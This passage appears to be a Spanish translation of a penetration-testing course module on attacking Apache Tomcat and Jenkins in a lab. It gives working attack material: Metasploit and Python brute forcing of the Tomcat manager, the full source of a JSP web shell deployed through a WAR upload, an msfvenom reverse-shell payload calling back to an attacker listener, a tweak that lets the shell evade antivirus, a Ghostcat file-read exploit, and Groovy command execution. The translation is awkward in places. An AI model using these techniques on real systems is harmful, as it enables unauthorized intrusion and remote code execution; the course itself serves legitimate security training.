    <servlet-class>com.inlanefreight.api.AdminServlet</servlet-class>
  </servlet>

  <servlet-mapping>
    <servlet-name>AdminServlet</servlet-name>
    <url-pattern>/admin</url-pattern>
  </servlet-mapping>
</web-app>   
```

El `web.xml` la configuración anterior define un nuevo servlet nombrado `AdminServlet` eso se asigna a la clase `com.inlanefreight.api.AdminServlet`. Java utiliza la notación de puntos para crear nombres de paquetes, lo que significa que la ruta en el disco para la clase definida anteriormente sería:

- `classes/com/inlanefreight/api/AdminServlet.class`

A continuación, se crea un nuevo mapeo de servlets para mapear solicitudes a `/admin` con `AdminServlet`. Esta configuración enviará cualquier solicitud recibida para `/admin` a la `AdminServlet.class` clase para procesamiento. El `web.xml` descriptor contiene mucha información confidencial y es un archivo importante para verificar al aprovechar una vulnerabilidad de Inclusión de Archivos Locales (LFI).

El `tomcat-users.xml` el archivo se utiliza para permitir o no permitir el acceso al `/manager` y `host-manager` páginas de administración.

Código: xml

```xml
<?xml version="1.0" encoding="UTF-8"?>

<SNIP>
  
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary.

  Built-in Tomcat manager roles:
    - manager-gui    - allows access to the HTML GUI and the status pages
    - manager-script - allows access to the HTTP API and the status pages
    - manager-jmx    - allows access to the JMX proxy and the status pages
    - manager-status - allows access to the status pages only

  The users below are wrapped in a comment and are therefore ignored. If you
  wish to configure one or more of these users for use with the manager web
  application, do not forget to remove the <!.. ..> that surrounds them. You
  will also need to set the passwords to something appropriate.
-->

   
 <SNIP>
  
!-- user manager can access only manager section -->
<role rolename="manager-gui" />
<user username="tomcat" password="tomcat" roles="manager-gui" />

<!-- user admin can access manager and admin section both -->
<role rolename="admin-gui" />
<user username="admin" password="admin" roles="manager-gui,admin-gui" />


</tomcat-users>
```

El archivo nos muestra cuál es cada uno de los roles `manager-gui`, `manager-script`, `manager-jmx`, y `manager-status` proporcionar acceso a. En este ejemplo, podemos ver que un usuario `tomcat` con la contraseña `tomcat` tiene el `manager-gui` rol y una segunda contraseña débil `admin` está configurado para la cuenta de usuario `admin`

---

## Enumeración

Después de tomar las huellas dactilares de la instancia de Tomcat, a menos que tenga una vulnerabilidad conocida, generalmente queremos buscar la `/manager` y el `/host-manager` páginas. Podemos intentar localizarlos con una herramienta como `Gobuster` o simplemente navegue directamente hacia ellos.

  Tomcat - Descubrimiento y enumeración

```shell-session
vcrdcr@htb[/htb]$ gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://web01.inlanefreight.local:8180/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/09/21 17:34:54 Starting gobuster
===============================================================
/docs (Status: 302)
/examples (Status: 302)
/manager (Status: 302)
Progress: 49959 / 87665 (56.99%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2021/09/21 17:44:29 Finished
===============================================================
```

Es posible que podamos iniciar sesión en uno de estos utilizando credenciales débiles como `tomcat:tomcat`, `admin:admin`, etc. Si estos primeros intentos no funcionan, podemos probar un ataque de fuerza bruta de contraseña contra la página de inicio de sesión, cubierta en la siguiente sección. Si tenemos éxito en iniciar sesión, podemos cargar un [Recurso de Aplicación Web o Aplicación Web ARchive (WAR)](https://en.wikipedia.org/wiki/WAR_\(file_format\)#:~:text=In%20software%20engineering%2C%20a%20WAR,that%20together%20constitute%20a%20web) archivo que contiene un shell web JSP y obtiene ejecución remota de código en el servidor Tomcat.

Ahora que hemos aprendido sobre la estructura y función de Tomcat, vamos a atacarla abusando de la funcionalidad incorporada y explotando una vulnerabilidad conocida que afectó a versiones específicas de Tomcat.


# Atacar a Tomcat

---

Hemos identificado que de hecho hay un anfitrión Tomcat expuesto externamente por nuestro cliente. Como el alcance de la evaluación es relativamente pequeño y todos los demás objetivos no son particularmente interesantes, prestemos toda nuestra atención a intentar obtener acceso interno a través de Tomcat.

Como se discutió en la sección anterior, si podemos acceder a la `/manager` o `/host-manager` endpoints, es probable que podamos lograr la ejecución remota de código en el servidor Tomcat. Comencemos forzando brutamente la página del administrador de Tomcat en la instancia de Tomcat en `http://web01.inlanefreight.local:8180`. Podemos usar el [auxiliar/escáner/http/tomcat_mgr_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login/) Módulo Metasploit para estos fines, Burp Suite Intruder o cualquier número de scripts para lograr esto. Usaremos Metasploit para nuestros propósitos.

---

## Tomcat Manager - Iniciar sesión Brute Force

Primero tenemos que establecer algunas opciones. Una vez más, debemos especificar el vhost y la dirección IP del objetivo para interactuar con el objetivo correctamente. También deberíamos establecer `STOP_ON_SUCCESS` a `true` por lo tanto, el escáner se detiene cuando obtenemos un inicio de sesión exitoso, sin uso para generar muchas solicitudes adicionales después de un inicio de sesión exitoso.

  Atacar a Tomcat

```shell-session
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
```

Como siempre, verificamos para asegurarnos de que todo esté configurado correctamente `show options`.

  Atacar a Tomcat

```shell-session
msf6 auxiliary(scanner/http/tomcat_mgr_login) > show options 

Module options (auxiliary/scanner/http/tomcat_mgr_login):

   Name              Current Setting                                                                 Required  Description
   ----              ---------------                                                                 --------  -----------
   BLANK_PASSWORDS   false                                                                           no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                                               yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                                                           no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                                           no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                                           no        Add all users in the current database to the list
   PASSWORD                                                                                          no        The HTTP password to specify for authentication
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt      no        File containing passwords, one per line
   Proxies                                                                                           no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS            10.129.201.58                                                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             8180                                                                            yes       The target port (TCP)
   SSL               false                                                                           no        Negotiate SSL/TLS for outgoing connections
   STOP_ON_SUCCESS   true                                                                            yes       Stop guessing when a credential works for a host
   TARGETURI         /manager/html                                                                   yes       URI for Manager login. Default is /manager/html
   THREADS           1                                                                               yes       The number of concurrent threads (max one per host)
   USERNAME                                                                                          no        The HTTP username to specify for authentication
   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt  no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                                                                           no        Try the username as the password for all users
   USER_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt     no        File containing users, one per line
   VERBOSE           true                                                                            yes       Whether to print output for all attempts
   VHOST             web01.inlanefreight.local                                                       no        HTTP server virtual host
```

Golpeamos `run` y consigue un golpe para el par de credenciales `tomcat:admin`.

  Atacar a Tomcat

```shell-session
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run

[!] No active DB -- Credential data will not be saved!
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:vagrant (Incorrect)
[+] 10.129.201.58:8180 - Login Successful: tomcat:admin
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Es importante tener en cuenta que hay muchas herramientas disponibles para nosotros como probadores de penetración. Muchos existen para hacer nuestro trabajo más eficiente, especialmente porque la mayoría de las pruebas de penetración están "en caja de tiempo" o bajo estrictas limitaciones de tiempo. Ninguna herramienta es mejor que otra, y no nos convierte en un "malo" probador de penetración si usamos ciertas herramientas como Metasploit para nuestro beneficio. Siempre que entendamos cada escáner y script de explotación que ejecutamos y los riesgos, entonces utilizar este escáner correctamente no es diferente de usar Burp Intruder o escribir un script Python personalizado. Algunos dicen, "trabaja más inteligente, no más duro." ¿Por qué haríamos un trabajo adicional para nosotros mismos durante una evaluación de 40 horas con 1,500 hosts en el alcance cuando podemos usar una herramienta en particular para ayudarnos? Es vital para nosotros entender `how` nuestras herramientas funcionan y cómo hacer muchas cosas manualmente. Podríamos probar manualmente cada par de credenciales en el navegador o escribir esto usando `cURL` o Python si lo elegimos. Como mínimo, si decidimos utilizar una determinada herramienta, deberíamos poder explicar su uso y el impacto potencial a nuestros clientes si nos cuestionan durante o después de la evaluación.

Digamos que un módulo Metasploit en particular (u otra herramienta) está fallando o no se comporta de la manera que creemos que debería. Siempre podemos usar Burp Suite o ZAP para proxy el tráfico y solucionar problemas. Para hacer esto, primero, encienda Burp Suite y luego configure el `PROXIES` opción como la siguiente:

  Atacar a Tomcat

```shell-session
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set PROXIES HTTP:127.0.0.1:8080

PROXIES => HTTP:127.0.0.1:8080


msf6 auxiliary(scanner/http/tomcat_mgr_login) > run

[!] No active DB -- Credential data will not be saved!
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:admin (Incorrect)
```

Podemos ver en Burp exactamente cómo funciona el escáner, teniendo en cuenta cada par de credenciales y la codificación base64 para la autenticación básica que usa Tomcat.

![imagen](https://academy.hackthebox.com/storage/modules/113/burp_tomcat.png)

Una rápida comprobación del valor en el `Authorization` el encabezado de una solicitud muestra que el escáner se está ejecutando correctamente, base64 codifica las credenciales `admin:vagrant` la forma en que lo haría la aplicación Tomcat cuando un usuario intenta iniciar sesión directamente desde la aplicación web. Pruebe esto para obtener algunos ejemplos a lo largo de este módulo para comenzar a sentirse cómodo con la depuración a través de un proxy.

  Atacar a Tomcat

```shell-session
vcrdcr@htb[/htb]$ echo YWRtaW46dmFncmFudA== |base64 -d

admin:vagrant
```

También podemos usar [esto](https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce) Script Python para lograr el mismo resultado.

Código: pitón

```python
#!/usr/bin/python

import requests
from termcolor import cprint
import argparse

parser = argparse.ArgumentParser(description = "Tomcat manager or host-manager credential bruteforcing")

parser.add_argument("-U", "--url", type = str, required = True, help = "URL to tomcat page")
parser.add_argument("-P", "--path", type = str, required = True, help = "manager or host-manager URI")
parser.add_argument("-u", "--usernames", type = str, required = True, help = "Users File")
parser.add_argument("-p", "--passwords", type = str, required = True, help = "Passwords Files")

args = parser.parse_args()

url = args.url
uri = args.path
users_file = args.usernames
passwords_file = args.passwords

new_url = url + uri
f_users = open(users_file, "rb")
f_pass = open(passwords_file, "rb")
usernames = [x.strip() for x in f_users]
passwords = [x.strip() for x in f_pass]

cprint("\n[+] Atacking.....", "red", attrs = ['bold'])

for u in usernames:
    for p in passwords:
        r = requests.get(new_url,auth = (u, p))

        if r.status_code == 200:
            cprint("\n[+] Success!!", "green", attrs = ['bold'])
            cprint("[+] Username : {}\n[+] Password : {}".format(u,p), "green", attrs = ['bold'])
            break
    if r.status_code == 200:
        break

if r.status_code != 200:
    cprint("\n[+] Failed!!", "red", attrs = ['bold'])
    cprint("[+] Could not Find the creds :( ", "red", attrs = ['bold'])
#print r.status_code
```

Este es un guión muy sencillo que toma algunos argumentos. Podemos ejecutar el script con `-h` para ver lo que requiere correr.

  Atacar a Tomcat

```shell-session
vcrdcr@htb[/htb]$ python3 mgr_brute.py  -h

usage: mgr_brute.py [-h] -U URL -P PATH -u USERNAMES -p PASSWORDS

Tomcat manager or host-manager credential bruteforcing

optional arguments:
  -h, --help            show this help message and exit
  -U URL, --url URL     URL to tomcat page
  -P PATH, --path PATH  manager or host-manager URI
  -u USERNAMES, --usernames USERNAMES
                        Users File
  -p PASSWORDS, --passwords PASSWORDS
                        Passwords Files
```

Podemos probar el script con el archivo predeterminado de usuarios y contraseñas de Tomcat que utiliza el módulo Metasploit anterior. ¡Lo ejecutamos y recibimos un golpe!

  Atacar a Tomcat

```shell-session
vcrdcr@htb[/htb]$ python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt

[+] Atacking.....

[+] Success!!
[+] Username : b'tomcat'
[+] Password : b'admin'
```

Si está interesado en las secuencias de comandos, consulte los módulos [Introducción a Python 3](https://academy.hackthebox.com/course/preview/introduction-to-python-3) y [Introducción a Bash Scripting](https://academy.hackthebox.com/course/preview/introduction-to-bash-scripting). Un buen ejercicio sería crear nuestros propios scripts de inicio de sesión de fuerza bruta de Tomcat Manager usando Python y Bash, pero dejaremos ese ejercicio a su disposición.

---

## Tomcat Manager - WAR Subida de archivos

Muchas instalaciones de Tomcat proporcionan una interfaz GUI para administrar la aplicación. Esta interfaz está disponible en `/manager/html` de forma predeterminada, que solo los usuarios asignaron el `manager-gui` se permite el acceso a los roles. Las credenciales válidas del administrador se pueden usar para cargar una aplicación Tomcat empaquetada (.Archivo WAR) y comprometer la aplicación. Un WAR, o Web Application Archive, se utiliza para implementar rápidamente aplicaciones web y almacenamiento de respaldo.

Después de realizar un ataque de fuerza bruta y responder a las preguntas 1 y 2 a continuación, navegue hacia `http://web01.inlanefreight.local:8180/manager/html` e ingrese las credenciales.

   

![](https://academy.hackthebox.com/storage/modules/113/tomcat_mgr.png)

La aplicación web del administrador nos permite implementar instantáneamente nuevas aplicaciones cargando archivos WAR. Se puede crear un archivo WAR utilizando la utilidad zip. Un shell web JSP como [esto](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp) se puede descargar y colocar dentro del archivo.

Código: java

```java
<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>
```

  Atacar a Tomcat

```shell-session
vcrdcr@htb[/htb]$ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
vcrdcr@htb[/htb]$ zip -r backup.war cmd.jsp 

  adding: cmd.jsp (deflated 81%)
```

Haga clic en `Browse` para seleccionar el archivo .war y luego haga clic en `Deploy`.

![imagen](https://academy.hackthebox.com/storage/modules/113/mgr_deploy.png)

Este archivo se carga en la GUI del administrador, después de lo cual el `/backup` la aplicación se agregará a la tabla.

   

![](https://academy.hackthebox.com/storage/modules/113/war_deployed.png)

Si hacemos clic en `backup`, seremos redirigidos a `http://web01.inlanefreight.local:8180/backup/` y conseguir un `404 Not Found` error. Necesitamos especificar el `cmd.jsp` archivo en la URL también. Navegando a `http://web01.inlanefreight.local:8180/backup/cmd.jsp` nos presentará un shell web que podemos usar para ejecutar comandos en el servidor Tomcat. Desde aquí, podríamos actualizar nuestro shell web a un shell inverso interactivo y continuar. Como ejemplos anteriores, podemos interactuar con este shell web a través del navegador o utilizando `cURL` en la línea de comandos. ¡Prueba ambos!

  Atacar a Tomcat

```shell-session
vcrdcr@htb[/htb]$ curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id

<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
Command: id<BR>
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)

</pre>
</BODY></HTML>
```

Para limpiar después de nosotros mismos, podemos volver a la página principal de Tomcat Manager y hacer clic en el `Undeploy` botón al lado del `backups` aplicación después, por supuesto, anotando el archivo y la ubicación de carga de nuestro informe, que en nuestro ejemplo es `/opt/tomcat/apache-tomcat-10.0.10/webapps`. Si hacemos un `ls` en ese directorio de nuestro shell web, veremos el subido `backup.war` archivo y el `backup` directorio que contiene el `cmd.jsp` guión y `META-INF` creado después de que la aplicación se implemente. Haciendo clic en `Undeploy` normalmente eliminará el archivo WAR cargado y el directorio asociado con la aplicación.

También podríamos usar `msfvenom` para generar un archivo WAR malicioso. La carga útil [java/jsp_shell_reverse_tcp](https://github.com/iagox86/metasploit-framework-webexec/blob/master/modules/payloads/singles/java/jsp_shell_reverse_tcp.rb) ejecutará un shell inverso a través de un archivo JSP. Navegue a la consola Tomcat e implemente este archivo. Tomcat extrae automáticamente el contenido del archivo WAR y lo implementa.

  Atacar a Tomcat

```shell-session
vcrdcr@htb[/htb]$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war

Payload size: 1098 bytes
Final size of war file: 1098 bytes
```

Inicie un oyente de Netcat y haga clic en `/backup` para ejecutar el shell.

  Atacar a Tomcat

```shell-session
vcrdcr@htb[/htb]$ nc -lnvp 4443

listening on [any] 4443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 45224


id

uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

El [multi/http/tomcat_mgr_upload](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/) El módulo Metasploit se puede usar para automatizar el proceso que se muestra arriba, pero lo dejaremos como un ejercicio para el lector.

[Esto](https://github.com/SecurityRiskAdvisors/cmd.jsp) El shell web JSP es muy ligero (debajo de 1kb) y utiliza un [Marcador](https://www.freecodecamp.org/news/what-are-bookmarklets/) o marcador del navegador para ejecutar el JavaScript necesario para la funcionalidad del shell web y la interfaz de usuario. Sin ella, navegando a un subido `cmd.jsp` no rendiría nada. Esta es una excelente opción para minimizar nuestra huella y posiblemente evadir detecciones de shells web JSP estándar (aunque el código JSP puede necesitar ser modificado un poco).

El shell web como es solo es detectado por 2/58 proveedores de antivirus.

![imagen](https://academy.hackthebox.com/storage/modules/113/vt2.png)

Un cambio simple como cambiar:

Código: java

```java
FileOutputStream(f);stream.write(m);o="Uploaded:
```

a:

Código: java

```java
FileOutputStream(f);stream.write(m);o="uPlOaDeD:
```

resultados en 0/58 proveedores de seguridad que marcan el `cmd.jsp` archivo como malicioso en el momento de escribir.

---

## Una Nota Rápida sobre los shells Web

Cuando subimos shells web (especialmente en externos), queremos evitar el acceso no autorizado. Debemos tomar ciertas medidas, como un nombre de archivo aleatorio (es decir, hash MD5), limitar el acceso a nuestra dirección IP de origen e incluso protegerla con contraseña. No queremos que un atacante se encuentre con nuestro shell web y lo aproveche para establecerse.

---

## CVE-2020-1938: Ghostcat

Se descubrió que Tomcat era vulnerable a un LFI no autenticado en un descubrimiento semi-reciente llamado [Ghostcat](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938). Todas las versiones de Tomcat anteriores a 9.0.31, 8.5.51 y 7.0.100 se encontraron vulnerables. Esta vulnerabilidad fue causada por una configuración incorrecta en el protocolo AJP utilizado por Tomcat. AJP significa Apache Jserv Protocol, que es un protocolo binario utilizado para las solicitudes de proxy. Esto se usa típicamente en solicitudes de proxy a servidores de aplicaciones detrás de los servidores web front-end.

El servicio AJP generalmente se ejecuta en el puerto 8009 en un servidor Tomcat. Esto se puede verificar con un escaneo Nmap específico.

  Atacar a Tomcat

```shell-session
vcrdcr@htb[/htb]$ nmap -sV -p 8009,8080 app-dev.inlanefreight.local

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-21 20:05 EDT
Nmap scan report for app-dev.inlanefreight.local (10.129.201.58)
Host is up (0.14s latency).

PORT     STATE SERVICE VERSION
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 9.0.30

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.36 seconds
```

El escaneo anterior confirma que los puertos 8080 y 8009 están abiertos. Se puede encontrar el código PoC para la vulnerabilidad [aquí](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi). Descargue el script y guárdelo localmente. El exploit solo puede leer archivos y carpetas dentro de la carpeta de aplicaciones web, lo que significa que archivos como `/etc/passwd` se puede acceder a Canalt. Intentemos acceder a la web.xml.

  Atacar a Tomcat

```shell-session
vcrdcr@htb[/htb]$ python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml 

Getting resource at ajp13://app-dev.inlanefreight.local:8009/asdf
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to Tomcat
  </description>

</web-app>
```

En algunas instalaciones de Tomcat, es posible que podamos acceder a datos confidenciales dentro del archivo WEB-INF.

---

## Avanzando

Tomcat siempre es un gran hallazgo en las pruebas de penetración internas y externas. Cada vez que lo encontremos, deberíamos probar el área de Tomcat Manager en busca de credenciales débiles/predeterminadas. Si podemos iniciar sesión, podemos convertir rápidamente este acceso en ejecución remota de código. Es común encontrar a Tomcat corriendo como usuarios de alto privilegio como SYSTEM o root, por lo que siempre vale la pena investigarlo, ya que podría proporcionarnos un punto de apoyo privilegiado en un servidor Linux o un servidor Windows unido al dominio en un entorno de Active Directory.


# Jenkins - Descubrimiento y enumeración

---

[Jenkins](https://www.jenkins.io/) es un servidor de automatización de código abierto escrito en Java que ayuda a los desarrolladores a construir y probar sus proyectos de software continuamente. Es un sistema basado en servidor que se ejecuta en contenedores de servlets como Tomcat. A lo largo de los años, los investigadores han descubierto varias vulnerabilidades en Jenkins, incluidas algunas que permiten la ejecución remota de código sin requerir autenticación. Jenkins es un [integración continua](https://en.wikipedia.org/wiki/Continuous_integration) servidor. Aquí hay algunos puntos interesantes sobre Jenkins:

- Jenkins fue originalmente llamado Hudson (lanzado en 2005) y fue renombrado en 2011 después de una disputa con Oracle
- [Datos](https://discovery.hgdata.com/product/jenkins) muestra que más de 86,000 compañías usan Jenkins
- Jenkins es utilizado por compañías conocidas como Facebook, Netflix, Udemy, Robinhood y LinkedIn
- Cuenta con más de 300 plugins para apoyar proyectos de construcción y prueba

---

## Descubrimiento/Footprinting

Supongamos que estamos trabajando en una prueba de penetración interna y hemos completado nuestros escaneos de descubrimiento web. Notamos lo que creemos que es una instancia de Jenkins y sabemos que a menudo se instala en servidores Windows que se ejecutan como la cuenta SYSTEM todopoderosa. Si podemos obtener acceso a través de Jenkins y obtener la ejecución remota de código como la cuenta SYSTEM, tendríamos un punto de apoyo en Active Directory para comenzar la enumeración del entorno de dominio.

Jenkins se ejecuta en el puerto Tomcat 8080 de forma predeterminada. También utiliza el puerto 5000 para conectar servidores esclavos. Este puerto se utiliza para comunicarse entre amos y esclavos. Jenkins puede usar una base de datos local, LDAP, base de datos de usuarios de Unix, delegar seguridad en un contenedor de servlets o no usar ninguna autenticación. Los administradores también pueden permitir o no permitir que los usuarios creen cuentas.

---

## Enumeración

   

![](https://academy.hackthebox.com/storage/modules/113/jenkins_global_security.png)

La instalación predeterminada generalmente usa la base de datos de Jenkins’ para almacenar credenciales y no permite a los usuarios registrar una cuenta. Podemos tomar las huellas dactilares de Jenkins rápidamente por la página de inicio de sesión reveladora.

   

![](https://academy.hackthebox.com/storage/modules/113/jenkins_login.png)

Podemos encontrar una instancia de Jenkins que utiliza credenciales débiles o predeterminadas, como `admin:admin` o no tiene habilitado ningún tipo de autenticación. No es raro encontrar instancias de Jenkins que no requieren autenticación durante una prueba de penetración interna. Aunque es raro, nos hemos encontrado con Jenkins durante las pruebas de penetración externas que pudimos atacar.


# Atacando a Jenkins

---

Hemos confirmado que el host está ejecutando Jenkins, y está configurado con credenciales débiles. Verifiquemos y veamos qué tipo de acceso nos dará esto.

Una vez que hemos obtenido acceso a una aplicación Jenkins, una forma rápida de lograr la ejecución de comandos en el servidor subyacente es a través de [Consola de Guión](https://www.jenkins.io/doc/book/managing/script-console/). La consola de scripts nos permite ejecutar scripts Groovy arbitrarios dentro del tiempo de ejecución del controlador Jenkins. Esto se puede abusar para ejecutar comandos del sistema operativo en el servidor subyacente. Jenkins a menudo se instala en el contexto de la cuenta raíz o SYSTEM, por lo que puede ser una victoria fácil para nosotros.

---

## Consola de Guión

Se puede llegar a la consola de scripts en la URL `http://jenkins.inlanefreight.local:8000/script`. Esta consola permite a un usuario ejecutar Apache [Groovy](https://en.wikipedia.org/wiki/Apache_Groovy) scripts, que son un lenguaje compatible con Java orientado a objetos. El lenguaje es similar a Python y Ruby. El código fuente de Groovy se compila en Java Bytecode y puede ejecutarse en cualquier plataforma que tenga JRE instalado.

Usando esta consola de scripts, es posible ejecutar comandos arbitrarios, funcionando de manera similar a un shell web. Por ejemplo, podemos usar el siguiente fragmento para ejecutar el `id` comando.

Código: groovy

```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

   

